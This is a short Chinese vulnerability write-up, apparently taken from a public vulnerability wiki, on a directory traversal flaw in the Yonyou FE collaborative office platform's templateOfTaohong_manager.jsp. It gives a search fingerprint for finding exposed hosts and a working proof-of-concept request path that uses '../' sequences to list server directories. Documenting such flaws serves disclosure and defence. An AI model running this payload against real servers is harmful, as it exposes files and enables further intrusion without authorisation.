---
title: "用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞"
date: 2026-10-17 09:12:51
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "用友"
tags:
  - "用友"
  - "目录遍历"
  - "漏洞复现"
---
## 漏洞描述

用友 FE协作办公平台 templateOfTaohong_manager.jsp文件存在目录遍历漏洞，通过漏洞攻击者可以获取目录文件等信息，导致进一步攻击

## 漏洞影响

```
用友 FE协作办公平台
```

## 网络测绘

```
"FE协作"
```

## 漏洞复现

登录页面

![image-20220520141413849](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201414968.png)

验证POC

```
/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
```

![image-20220520141519859](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201415920.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-templateOfTaohong_manager.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
